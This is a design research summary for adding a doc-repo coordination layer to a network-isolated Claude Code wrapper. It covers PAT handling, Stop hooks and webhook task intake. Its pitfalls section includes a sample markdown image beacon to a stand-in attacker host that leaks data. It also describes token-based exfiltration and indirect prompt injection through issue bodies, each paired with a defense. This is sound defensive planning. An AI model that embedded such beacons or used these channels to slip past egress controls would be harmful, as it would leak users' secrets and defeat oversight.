# Project Research Summary

**Project:** claude-secure v4.0 Agent Documentation Layer
**Domain:** Agent coordination infrastructure — bidirectional doc repo integration on top of a security-hardened, network-isolated Claude Code wrapper
**Researched:** 2026-04-13
**Confidence:** HIGH

## Executive Summary

The v4.0 milestone turns the existing Phase 16 result channel (single-file report push) into a full documentation coordination layer. The doc repo becomes both an outbox (agents write structured reports, todo mutations, and architecture notes) and an inbox (webhook-dispatched tasks flow from doc-repo Issues into profile-scoped spawns). Research across all four dimensions confirms that approximately 70% of the required machinery already exists in Phases 12-17. The milestone is an extension, not a rebuild.

The recommended approach is conservative and additive: reuse the Phase 16 git-clone/commit/push harness for multi-file commits, extend the Phase 14/15 webhook listener with a new event routing rule for doc-repo pushes, add a Stop hook to enforce report writing, and extend profile.json with doc repo binding fields. No new containers, no new long-running services, no new host dependencies beyond bumping the git version check to 2.34. The only transport that satisfies atomicity and security requirements is `git push` over HTTPS with a fine-grained PAT held on the host, outside the Claude container.

The single highest-severity risk is architectural: the doc-repo write token must never enter the Claude container. All git operations must run in `bin/claude-secure` on the host (as Phase 16 already does), with the docs clone bind-mounted read-only into the container and agent-produced artifacts spool-filed to `/workspace/` for host-side pickup. Every other pitfall — Stop-hook loops, parallel push races, webhook prompt injection, markdown exfil beacons — has a well-defined prevention strategy and should be gated per phase. The security posture of v1.0 is preserved provided these constraints are enforced from the first design decision in each phase.

## Key Findings

### Recommended Stack

No new technologies are added to the stack. The v4.0 stack is entirely the existing v1.0-v3.0 stack with two precision additions: `git 2.34+` sparse/partial clone flags (`--filter=blob:none --sparse`) and a GitHub fine-grained PAT scoped to a single repository. The `gh` CLI, REST/GraphQL client libraries, `libgit2`, `dulwich`, polling daemons, and a fourth Docker container were all evaluated and rejected. The decisive factor in all rejections is security surface: each addition introduces a new secret-handling path or supply-chain dependency in a tool whose core value is eliminating uncontrolled egress.

**Core technologies (new or changed for v4.0):**
- `git` CLI (2.34+): sparse + partial clone of docs repo — already installed, extend the Phase 16 clone pattern with `--filter=blob:none --sparse`
- GitHub fine-grained PAT as `DOCS_REPO_TOKEN`: single-repo scoped credential, stored in profile `.env`, redacted automatically by Phase 3 proxy — preferred over classic PAT (full-repo access) and SSH deploy keys (key management surface)
- `git push` over HTTPS with host-side PAT: atomic multi-file commits, 3-attempt jittered retry, never force-push — the only transport that supports atomicity; REST API (one file per call) and `gh` CLI (no atomic multi-file path) both rejected

**Unchanged:** Node 22 proxy, Python 3.11 validator, Docker Compose internal network, iptables, Bash hooks.

### Expected Features

**Must have (table stakes):**
- T5: Profile ↔ doc repo binding — `docs_repo`, `docs_branch`, `docs_project_dir`, `docs_mode` in profile.json; `DOCS_REPO_TOKEN` in `.env` — unblocks everything
- T1: Standardized agent report template — fixed schema: goal, where worked, what changed, what failed, how to test, future findings
- T2: Per-project doc repo structure — `projects/<name>/todo.md`, `architecture.md`, `vision.md`, `ideas.md`, `specs/`, `reports/YYYY/MM/`
- T3: Mandatory last-step reporting via Stop hook — best-effort with local spool, async ship, never blocks Claude exit
- T6: INDEX.md append — one-line entry per report, same Stop hook commit
- T4: Bidirectional task flow via GitHub Issues — label `agent-task` → `resolve_profile_by_docs_repo` → `do_spawn`

**Should have (differentiators):**
- D1: Security-preserving report pipeline — report push traverses same redaction path as Anthropic traffic
- D2: Scout findings feed back into todo.md — "Future Findings" bullets auto-appended as P3 items

**Defer to v4.1+:** per-profile template inheritance (D3), TASKS.md file-polling (T4b), interactive-mode reporting

**Never ship:** live dashboards, agent-rewritable architecture/vision docs without gating, verbose per-tool-call entries, auto-close Issues, custom markdown DSL, cross-project search, agent-authored profile changes.

### Architecture Approach

All git operations run on the host in `bin/claude-secure`, not inside the Claude container. The docs clone is bind-mounted read-only into the container so agents can read vision.md and architecture.md as context. Agent-produced artifacts are written to `/workspace/` then read by the host-side `publish_docs_bundle` after Claude exits, redacted, and committed in a single atomic push.

**Major components (new or modified):**
1. `bin/claude-secure: fetch_docs_context` — startup shallow+sparse clone, read-only bind mount, prompt variables `{{VISION}}`, `{{ARCHITECTURE_SUMMARY}}`, `{{TODO_OPEN_ITEMS}}`
2. `bin/claude-secure: publish_docs_bundle` — extends `publish_report` to accept N (path, body) pairs, single atomic commit, 3-attempt retry; D-15 redactor runs over every staged file unconditionally
3. `bin/claude-secure: stage_docs_update` — reads `/workspace/.todo-patch.md` and `/workspace/.ideas-append.md`, validates, redacts, queues for bundle commit
4. Stop hook — verifies local spool file exists (no network); host-side async shipper sends spooled reports with backoff; `stop_hook_active` guard prevents re-prompt loops
5. `webhook/listener.py: resolve_profile_by_docs_repo` — routes `push` and `issues.labeled` events from doc repo to correct profile
6. `webhook/docs-templates/` — `agent-report.md`, `docs-task.md`, `todo-append.md`

**Must-NOT-touch:** `proxy/server.js`, `validator/`, `hooks/pretooluse.sh`, `compose.yaml` network topology.

### Critical Pitfalls

1. **Doc-repo token as egress channel (C-1)** — PAT in the Claude container makes git push an uncontrolled exfil path bypassing all four security layers. Prevention: PAT lives in host-only `.env`, never mounted into container; all git operations run on the host. Must be locked at Phase A — this is the single most dangerous architectural decision in v4.0.

2. **Stop-hook loop on report failure (C-2)** — if Stop hook blocks on doc-repo network failure, Claude re-prompts indefinitely. Prevention: Stop hook only verifies local spool file (no network); async host-side shipper handles push with backoff; `stop_hook_active` guard is mandatory. Test: "doc repo DNS fails, assert Claude exits cleanly within 5 seconds."

3. **Parallel push race on shared doc repo (C-3)** — N concurrent agents pushing to `main` produce non-fast-forward rejections; shared files produce merge conflicts. Prevention: per-session filenames under `reports/<project>/<YYYY-MM-DD>/<session-id>.md` eliminate report collisions; host-side write daemon serializes pushes with `flock`; agents never write shared files directly.

4. **Webhook payload as indirect prompt injection (C-4)** — issue bodies from the doc repo flowing into agent prompts is textbook indirect prompt injection. Prevention: structured fields only (repo name, issue number, labels), never raw issue body in prompts; agents fetch issue body as data; Phase 15 sanitization pass reused unconditionally; profile-scoped `allowed_repos` allowlist.

5. **Markdown exfil beacons in agent-authored reports (C-5)** — `![](https://attacker.tld/?data=...)` in committed reports is fetched by any markdown renderer. Prevention: `publish_docs_bundle` runs markdown sanitizer over every staged file (strip external image refs, HTML comments, raw HTML); fixed-schema report with typed fields and length caps.

## Implications for Roadmap

### Phase A: Profile Schema Extension + Back-Compat Aliases
**Rationale:** Everything else depends on the profile knowing where to write. Zero behavior change — safe to land first.
**Delivers:** `docs_repo`, `docs_branch`, `docs_project_dir`, `docs_mode` in profile.json; `DOCS_REPO_TOKEN` with `REPORT_REPO_TOKEN` fallback; deprecation warnings.
**Addresses:** T5
**Avoids:** M-1 (separate `.docs-repo-key` file with 0400 perms)

### Phase B: Multi-File Publish Bundle (Outbound Path)
**Rationale:** Core deliverable. Immediately visible to users. Can proceed in parallel with Phase A.
**Delivers:** `publish_docs_bundle` (multi-file atomic commit), `render_agent_report_bundle`, `agent-report.md` template, INDEX.md append, D-15 redactor on all staged files.
**Addresses:** T1, T6, D1, D2 (scout findings section in template)
**Avoids:** C-5 (markdown sanitizer in publish_docs_bundle), C-1 (PAT never in container), M-7 (redact all staged files)

### Phase C: fetch_docs_context + Read-Only Bind Mount
**Rationale:** Agents need project context before working. Depends on Phase A. Delivers the read half of the bidirectional loop.
**Delivers:** `fetch_docs_context` startup clone, read-only bind mount at `/agent-docs/`, prompt template variables `{{VISION}}`, `{{ARCHITECTURE_SUMMARY}}`, `{{TODO_OPEN_ITEMS}}`; graceful skip when absent.
**Avoids:** m-4 (no `.git` mount), M-2 (unix socket, not host.docker.internal)

### Phase D: Stop Hook + Spool-Based Mandatory Reporting
**Rationale:** Enforcement point. Depends on Phases B and C. Makes reporting guaranteed rather than optional.
**Delivers:** Stop hook (local spool verification only, no network); host-side async shipper with jittered backoff; `stage_docs_update` for todo/ideas patch artifacts; `stop_hook_active` guard; failure-mode spec.
**Addresses:** T3
**Avoids:** C-2 (hook never touches network), M-4 (spool size cap + LRU), m-3 (log SHA only)
**Research flag:** Stop hook API field names — re-verify with Context7 at plan time.

### Phase E: Webhook Inbound Path (Doc Repo → Agent)
**Rationale:** Completes the bidirectional loop. Depends on Phase D (outbound must be proven first). Highest-complexity phase.
**Delivers:** `resolve_profile_by_docs_repo`, `docs-inbox`/`docs-todo` event types, path-based filter, `docs-task.md` prompt template, HMAC timing-safe comparison audit, profile-scoped repo allowlist.
**Addresses:** T4
**Avoids:** C-4 (structured fields only), M-5 (timing-safe HMAC), M-6 (no URLs from payload)
**Research flag:** Needs `/gsd:research-phase` — `docs-inbox` event-type filter against real GitHub push payload shapes is a new design not yet validated.

### Phase F: Integration Tests + Operational Hardening
**Rationale:** All functional phases complete; harden before v4.0 ship.
**Delivers:** Roundtrip integration test (seed inbox → HMAC POST → assert docs commit delta); N=4 parallel-agent push test; M-3 token expiry warning; `claude-secure profile init-docs` bootstrap subcommand; report path migration documentation; back-compat test for Phase 16 profiles.
**Addresses:** C-3 (parallel push test gates serialization strategy), M-3, M-4

### Phase Ordering Rationale

- A before C: profile schema must exist before fetch_docs_context knows which `docs_project_dir` to clone.
- B before D: publish_docs_bundle must exist before the Stop hook can call it.
- C before D: bind mount and prompt variables are preconditions for context-aware reports.
- D before E: outbound path must be proven before accepting inbound tasks that trigger outbound writes.
- A and B in parallel: neither depends on the other.
- F last: integration tests cannot validate what isn't built.

### Research Flags

Phases needing `/gsd:research-phase`:
- **Phase D:** Stop hook `stop_hook_active` field semantics and re-prompt trigger conditions — version-sensitive, re-verify with Context7 at plan time.
- **Phase E:** `docs-inbox`/`docs-todo` event-type filter tuning against real GitHub push payload shapes — validate before writing listener code.

Phases with standard patterns (skip research-phase):
- **Phase A:** profile.json schema extension follows existing Phase 12 patterns.
- **Phase B:** multi-file git commit is a direct extension of proven Phase 16 harness.
- **Phase C:** git sparse-checkout flags are documented and stable.
- **Phase F:** test scaffolding follows Phase 16/17 shell-script pattern.

## Confidence Assessment

| Area | Confidence | Notes |
|------|------------|-------|
| Stack | HIGH | All decisions reuse proven Phase 16 transport; alternatives rejected with specific documented reasons; fine-grained PAT is GitHub's own recommendation since 2023 |
| Features | HIGH | T1-T6 sourced from multiple independent converging specs (TASKS.md, Claude Code hooks reference, GitHub Agentic Workflows, HANDOFF.md pattern); anti-features grounded in architecture constraints |
| Architecture | HIGH | Based on direct code inspection of shipped Phase 12-17 source (line numbers cited); only inbound webhook filter tuning is new design (MEDIUM for that section) |
| Pitfalls | HIGH | C-1 is first-principles from v1.0 threat model; C-2 is documented Claude Code behavior; C-3 is standard distributed-git race; C-4/C-5 have canonical CVE-level case studies. MEDIUM only on exact Stop hook API fields at implementation time. |

**Overall confidence:** HIGH

## Gaps to Address

- **Stop hook API version:** Re-verify `stop_hook_active` field name and re-prompt semantics with Context7 during Phase D planning.
- **Webhook filter tuning:** Validate `payload.commits[].added/modified` path filter against a real GitHub push payload before Phase E implementation.
- **todo.md line-anchor format:** GFM task list with `<!-- id:abc123 -->` vs YAML frontmatter — needs a decision before Phase D ships `stage_docs_update`. Recommendation: GFM with comment anchor.
- **Docs repo bootstrapping UX:** Stub in Phase C (create dirs on first clone if absent) vs full subcommand in Phase F — lock at roadmap time.
- **Report path migration:** Old flat `reports/YYYY/MM/` vs new `projects/<name>/reports/` — lock before Phase B writes any new reports. Recommendation: new reports go under project dir; document the cutover in v4.0 release notes.

## Sources

### Primary (HIGH confidence)
- `.planning/phases/16-result-channel/16-CONTEXT.md` — D-01 through D-18 locked decisions; canonical Phase 16 transport reference
- `.planning/phases/14-webhook-listener/14-CONTEXT.md` — inbound webhook substrate
- `.planning/phases/15-event-handlers/15-CONTEXT.md` — template fallback chain + payload sanitization
- `bin/claude-secure` (direct code inspection, lines 343-1424) — publish_report, audit writer, do_spawn
- `webhook/listener.py` (direct code inspection, lines 44-535) — event type, filter, profile resolver
- GitHub fine-grained PAT docs (official) — scoping, 366-day expiry, per-repo permissions
- git-sparse-checkout documentation (official) — `--filter=blob:none --sparse`, stable since git 2.25
- Claude Code hooks reference — Stop hook semantics, `stop_hook_active`
- TASKS.md spec (tasksmd.github.io) — per-project doc layout, Scout pattern, GFM task format

### Secondary (MEDIUM confidence)
- GitHub Agentic Workflows technical preview (Feb 2026) — Issues-as-task-queue direction
- Allen Chan AI Agent Anti-Patterns Part 2 (Mar 2026) — verbose tool-trace anti-pattern
- Anthropic 2026 Agentic Coding Trends Report — layered-review pattern
- Checkmarx / Copilot Chat markdown injection writeup — C-5 image-beacon exfil
- Legit Security GitLab Duo remote prompt injection — C-4 canonical case

### Tertiary (LOW confidence — validate during implementation)
- Stop hook exact JSON field names — re-verify with Context7 at Phase D planning time
- GitHub push webhook payload shape for path-based filter — validate with real payload before Phase E

---
*Research completed: 2026-04-13*
*Ready for roadmap: yes*
